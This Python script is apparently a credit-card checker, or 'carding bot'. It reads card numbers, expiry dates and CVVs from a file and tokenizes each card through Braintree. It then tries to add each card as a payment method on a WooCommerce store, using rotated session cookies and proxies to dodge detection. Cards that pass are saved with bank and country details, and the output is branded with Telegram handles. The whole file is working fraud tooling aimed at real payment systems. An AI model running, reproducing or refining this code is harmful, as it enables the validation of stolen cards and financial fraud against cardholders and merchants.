import requests
import re
import base64
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import time
import json
from datetime import datetime
import random
import urllib3
import sys
import io
import codecs
import os
import glob

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variable to store the selected cookie pair
SELECTED_COOKIE_PAIR = None


def discover_cookie_pairs():
    """Discover available cookie pairs in the current directory"""
    try:
        # Find all cookies_X-1.txt files
        pattern1 = 'cookies_*-1.txt'
        pattern2 = 'cookies_*-2.txt'
        
        files1 = glob.glob(pattern1)
        files2 = glob.glob(pattern2)
        
        # Extract the pair identifiers (e.g., "1" from "cookies_1-1.txt")
        pairs = []
        for file1 in files1:
            # Extract the pair number from filename like "cookies_1-1.txt"
            pair_id = file1.replace('cookies_', '').replace('-1.txt', '')
            file2_expected = f'cookies_{pair_id}-2.txt'
            
            if file2_expected in files2:
                pairs.append({
                    'id': pair_id,
                    'file1': file1,
                    'file2': file2_expected
                })
        
        return pairs
    except Exception as e:
        print(f"Error discovering cookie pairs: {str(e)}")
        return []

def select_random_cookie_pair():
    """Select a random cookie pair from available pairs"""
    global SELECTED_COOKIE_PAIR
    
    pairs = discover_cookie_pairs()
    if not pairs:
        print("No cookie pairs found! Make sure you have files like cookies_1-1.txt, cookies_1-2.txt, etc.")
        # Fallback to old system
        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
        return SELECTED_COOKIE_PAIR
    
    # Select random pair
    selected_pair = random.choice(pairs)
    SELECTED_COOKIE_PAIR = selected_pair
    print(f"🎲 Selected cookie pair: {selected_pair['id']} ({selected_pair['file1']}, {selected_pair['file2']})")
    return selected_pair

def select_new_cookie_pair_silent():
    """Select a new random cookie pair without printing (for each card check)"""
    global SELECTED_COOKIE_PAIR
    
    pairs = discover_cookie_pairs()
    if not pairs:
        # Fallback to old system
        SELECTED_COOKIE_PAIR = {'file1': 'cookies_1.txt', 'file2': 'cookies_2.txt', 'id': 'fallback'}
        return SELECTED_COOKIE_PAIR
    
    # Select random pair
    selected_pair = random.choice(pairs)
    SELECTED_COOKIE_PAIR = selected_pair
    return selected_pair

def read_cookies_from_file(filename):
    """Read cookies from a specific file"""
    try:
        with open(filename, 'r') as f:
            content = f.read()
            # Create a namespace dictionary for exec
            namespace = {}
            exec(content, namespace)
            return namespace['cookies']
    except Exception as e:
        print(f"Error reading {filename}: {str(e)}")
        return {}

# Read domain URL from site.txt
def get_domain_url():
    try:
        with open('site.txt', 'r') as f:
            return f.read().strip()
    except Exception as e:
        print(f"Error reading site.txt: {str(e)}")
        return ""  # fallback

# Read cookies from the selected first cookie file
def get_cookies_1():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file1'])

# Read cookies from the selected second cookie file
def get_cookies_2():
    global SELECTED_COOKIE_PAIR
    if SELECTED_COOKIE_PAIR is None:
        select_new_cookie_pair_silent()
    
    return read_cookies_from_file(SELECTED_COOKIE_PAIR['file2'])

user = generate_user_agent()

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None

def get_headers():
    """Get headers with current domain URL"""
    domain_url = get_domain_url()
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'dnt': '1',
        'priority': 'u=0, i',
        'referer': f'{domain_url}/my-account/payment-methods/',
        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

def get_random_proxy():
    """Get a random proxy from proxy.txt file"""
    try:
        with open('proxy.txt', 'r') as f:
            proxies = f.readlines()
            proxy = random.choice(proxies).strip()

            # Parse proxy string (format: host:port:username:password)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
            return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

def get_new_auth():
    """Get fresh authorization tokens"""
    domain_url = get_domain_url()  # Read fresh domain URL
    cookies_1 = get_cookies_1()    # Read fresh cookies
    headers = get_headers()        # Get headers with current domain
    
    proxy = get_random_proxy()
    response = requests.get(
        f'{domain_url}/my-account/add-payment-method/',
        cookies=cookies_1,
        headers=headers,
        proxies=proxy,
        verify=False
    )
    if response.status_code == 200:
        # Get add_nonce
        add_nonce = re.findall('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            print("Error: Nonce not found in response")
            return None, None

        # Get authorization token
        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 != -1:
            i1 = response.text.find('"]', i0)
            token = response.text[i0 + 30:i1]
            try:
                decoded_text = base64.b64decode(token).decode('utf-8')
                au = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded_text)
                if not au:
                    print("Error: Authorization fingerprint not found")
                    return None, None
                return add_nonce[0], au[0]
            except Exception as e:
                print(f"Error decoding token: {str(e)}")
                return None, None
        else:
            print("Error: Client token not found in response")
            return None, None
    else:
        print(f"Error: Failed to fetch payment page, status code: {response.status_code}")
        return None, None

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://api.voidex.dev/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()

            # Check if we have valid data
            if not data or 'brand' not in data:
                return {
                    'brand': 'UNKNOWN',
                    'type': 'UNKNOWN',
                    'level': 'UNKNOWN',
                    'bank': 'UNKNOWN',
                    'country': 'UNKNOWN',
                    'emoji': '🏳️'
                }

            # Return data mapped from Voidex API response
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('brand', 'UNKNOWN'),  # Using brand as level fallback
                'bank': data.get('bank', 'UNKNOWN'),
                'country': data.get('country_name', 'UNKNOWN'),
                'emoji': data.get('country_flag', '🏳️')
            }

        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }
    except Exception as e:
        print(f"BIN lookup error: {str(e)}")
        return {
            'brand': 'UNKNOWN',
            'type': 'UNKNOWN',
            'level': 'UNKNOWN',
            'bank': 'UNKNOWN',
            'country': 'UNKNOWN',
            'emoji': '🏳️'
        }

def check_status(result):
    # First, check if the message contains "Reason:" and extract the specific reason
    if "Reason:" in result:
        # Extract everything after "Reason:"
        reason_part = result.split("Reason:", 1)[1].strip()

        # Check if it's one of the approved patterns
        approved_patterns = [
            'Nice! New payment method added',
            'Payment method successfully added.',
            'Insufficient Funds',
            'Gateway Rejected: avs',
            'Duplicate',
            'Payment method added successfully',
            'Invalid postal code or street address',
            #'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
        ]

        cvv_patterns = [
            'CVV',
            'Gateway Rejected: avs_and_cvv',
            'Card Issuer Declined CVV',
            'Gateway Rejected: cvv'
        ]

        # Check if the extracted reason matches approved patterns
        for pattern in approved_patterns:
            if pattern in result:
                return "APPROVED CC", reason_part, True

        # Check if the extracted reason matches CVV patterns
        for pattern in cvv_patterns:
            if pattern in reason_part:
                return "APPROVED CC", reason_part, True

        # Return the extracted reason for declined cards
        return "DECLINED CC", reason_part, False


    # If "Reason:" is not found, use the original logic
    approved_patterns = [
        'Nice! New payment method added',
        'Payment method successfully added.',
        'Insufficient Funds',
        'Gateway Rejected: avs',
        'Duplicate',
        'Payment method added successfully',
        'Invalid postal code or street address',
        #'You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds',
    ]

    cvv_patterns = [
        'Reason: CVV',
        'Gateway Rejected: avs_and_cvv',
        'Card Issuer Declined CVV',
        'Gateway Rejected: cvv'
    ]

    for pattern in approved_patterns:
        if pattern in result:
            return "APPROVED CC", result, True

    for pattern in cvv_patterns:
        if pattern in result:
            return "APPROVED CC", reason_part, True

    return "DECLINED CC", result, False

def check_card(cc_line):
    # Select new cookie pair for this card check
    select_new_cookie_pair_silent()
    
    from datetime import datetime
    start_time = time.time()

    try:
        domain_url = get_domain_url()  # Read fresh domain URL
        cookies_2 = get_cookies_2()    # Read fresh cookies
        headers = get_headers()        # Get headers with current domain
        
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            return "❌ Authorization failed. Try again later."

        n, mm, yy, cvc = cc_line.strip().split('|')
        if not yy.startswith('20'):
            yy = '20' + yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers_token = {
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': user
        }

        proxy = get_random_proxy()
        try:
            response = requests.post(
                'https://payments.braintree-api.com/graphql',
                headers=headers_token,
                json=json_data,
                proxies=proxy,
                verify=False
            )
        except requests.exceptions.SSLError:
            return "❌ SSL Error: Secure connection failed. Please try again."
        if response.status_code != 200:
            return f"❌ Tokenization failed. Status: {response.status_code}"

        token = response.json()['data']['tokenizeCreditCard']['token']

        headers_submit = headers.copy()
        headers_submit['content-type'] = 'application/x-www-form-urlencoded'

        data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': token,
            'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        try:
            response = requests.post(
                f'{domain_url}/my-account/add-payment-method/',
                cookies=cookies_2,
                headers=headers,
                data=data,
                proxies=proxy,
                verify=False
            )
        except requests.exceptions.SSLError:
            return "❌ SSL Error: Unable to reach the server securely."


        elapsed_time = time.time() - start_time
        soup = BeautifulSoup(response.text, 'html.parser')
        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
        message = error_div.get_text(strip=True) if error_div else "❌ Unknown error"

        status, reason, approved = check_status(message)
        bin_info = get_bin_info(n[:6]) or {}

        response_text = f"""
{status} {'❌' if not approved else '✅'}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        return response_text

    except Exception as e:
       return f"❌ Error: {str(e)}"

# Add these lines right after the imports to properly handle Unicode output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

print("🚀 Starting script...")

file = open('cc.txt', "r+")
start_num = 0

for P in file.readlines():
    start_time = time.time()
    start_num += 1

    try:
        # 🎲 Select NEW random cookie pair for each card check
        select_new_cookie_pair_silent()
        print(f"🔄 Card #{start_num} using cookie pair: {SELECTED_COOKIE_PAIR['id']}")
        
        domain_url = get_domain_url()  # Read fresh domain URL for each card
        cookies_2 = get_cookies_2()    # Read fresh cookies for each card
        
        # Get fresh authorization for each card
        add_nonce, au = get_new_auth()
        if not add_nonce or not au:
            end_time = time.time()
            elapsed_time = end_time - start_time
            print(f"Skipping card due to authorization failure (Time taken: {elapsed_time:.2f} seconds)")
            continue

        n = P.split('|')[0]
        bin3 = n[:6]
        mm = P.split('|')[1]
        if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
            mm = mm
        elif '0' not in mm:
            mm = f'0{mm}'
        else:
            mm = mm
        yy = P.split('|')[2]
        cvc = P.split('|')[3].replace('\n', '')
        P = P.replace('\n', '')
        if "20" not in yy:
            yy = f'20{yy}'
        else:
            yy = yy

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'cc600ecf-f0e1-4316-ac29-7ad78aeafccd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': '10080',
                            'streetAddress': '147 street',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'dnt': '1',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        proxy = get_random_proxy()
        response = requests.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json=json_data,
            proxies=proxy,
            verify=False
        )
        end_time = time.time()
        elapsed_time = end_time - start_time

        if response.status_code == 200:
            try:
                token_data = response.json()
                if token_data and 'data' in token_data and 'tokenizeCreditCard' in token_data['data'] and 'token' in token_data['data']['tokenizeCreditCard']:
                    token = token_data['data']['tokenizeCreditCard']['token']


                    headers = {
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                        'accept-language': 'en-US,en;q=0.9',
                        'cache-control': 'max-age=0',
                        'content-type': 'application/x-www-form-urlencoded',
                        'dnt': '1',
                        'origin': domain_url,
                        'priority': 'u=0, i',
                        'referer': f'{domain_url}/my-account/add-payment-method/',
                        'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'same-origin',
                        'sec-gpc': '1',
                        'upgrade-insecure-requests': '1',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
                    }

                    data = {
                        'payment_method': 'braintree_cc',
                        'braintree_cc_nonce_key': token,
                        'braintree_cc_device_data': '{"correlation_id":"cc600ecf-f0e1-4316-ac29-7ad78aea"}',
                        'braintree_cc_3ds_nonce_key': '',
                        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/wcr3cvc237q7jz6b/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/wcr3cvc237q7jz6b"},"merchantId":"wcr3cvc237q7jz6b","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","Maestro","UK Maestro","MasterCard","Visa","American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYjg0OGU1NS1jY2EyLTRiZGUtODY3MS01OTJiODkzNjA1ZGUiLCJpYXQiOjE3NDk3MzMyMjcsImV4cCI6MTc0OTc0MDQyNywiaXNzIjoiNWQyZTYwYTFmYWI4ZDUxYzE4ZDdhNzdlIiwiT3JnVW5pdElkIjoiNWQyZTYwYTE2OTRlM2E0NDY0ZWRkN2NlIn0.jVz8RHEJRVCxCiXKnm0jv9uYuuEUEWopnrbi9A2ng_Y"},"paypalEnabled":true,"paypal":{"displayName":"Hakko","clientId":"AR5mQQV5vUNYSF9-TCEtSXM7mHHUfFc5hSihOKKmEyMzg9z0FNLzrfdVyTK-X_06XQ4ZCCbFww-R91jp","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"hakkoGBP","payeeEmail":null,"currencyIsoCode":"GBP"}}',
                        'woocommerce-add-payment-method-nonce': add_nonce,
                        '_wp_http_referer': '/my-account/add-payment-method/',
                        'woocommerce_add_payment_method': '1',
                    }

                    proxy = get_random_proxy()
                    response = requests.post(
                        f'{domain_url}/my-account/add-payment-method/',
                         cookies=cookies_2,
                        headers=headers,
                        data=data,
                        proxies=proxy,
                        verify=False
                    )
                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        error_div = soup.find('div', class_='woocommerce-notices-wrapper')
                        if error_div:
                            error_message = error_div.get_text(strip=True)
                            if error_message:
                                bin_info = get_bin_info(bin3)
                                status, message, is_approved = check_status(error_message)

                                # Save approved cards to approved.txt
                                if is_approved:
                                    with open('approved.txt', 'a', encoding='utf-8') as approved_file:
                                        approved_file.write(f"""=========================
[APPROVED]

Card: {n}|{mm}|{yy}|{cvc}
Response: {message}
Gateway: Braintree Auth
Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
Country: {bin_info['country']} {bin_info['emoji']}
Issuer: {bin_info['bank']}
Bin: {bin3}
Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
Time: {elapsed_time:.1f}s
Bot By: 『@mhitzxg 帝 @pr0xy_xd』

=========================\n\n""")

                                response = f"""
=========================
{status}

Card: {n}|{mm}|{yy}|{cvc}
Response: {message}
Gateway: Braintree Auth
Info: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
Country: {bin_info['country']} {bin_info['emoji']}
Issuer: {bin_info['bank']}
Bin: {bin3}
Cookie Pair: {SELECTED_COOKIE_PAIR['id']}
Time: {elapsed_time:.1f}s
Bot By: 『@mhitzxg 帝 @pr0xy_xd』
=========================
"""
                                try:
                                    sys.stdout.write(response)
                                    sys.stdout.flush()
                                except:
                                    # If that fails, try a more basic output
                                    basic_response = f"Card: {n}|{mm}|{yy}|{cvc} - {message} - Cookie Pair: {SELECTED_COOKIE_PAIR['id']} - Time: {elapsed_time:.1f}s"
                                    print(basic_response)
                            else:
                                print(f"Card {n}: No message found in response (Time taken: {elapsed_time:.2f} seconds)")
                        else:
                            print(f"Card {n}: No woocommerce-notices-wrapper found (Time taken: {elapsed_time:.2f} seconds)")
                    else:
                        print(f"Card {n}: Failed to add payment method, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
                else:
                    print(f"Card {n}: Invalid or missing token data in response (Time taken: {elapsed_time:.2f} seconds)")
            except ValueError as e:
                print(f"Card {n}: Invalid JSON response from tokenization: {str(e)} (Time taken: {elapsed_time:.2f} seconds)")
        else:
            print(f"Card {n}: Tokenization failed, status code: {response.status_code} (Time taken: {elapsed_time:.2f} seconds)")
    except IndexError:
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Invalid card format: {P} (Time taken: {elapsed_time:.2f} seconds)")
        continue

    # Add a delay between cards to avoid rate limiting
    time.sleep(2)

file.close()














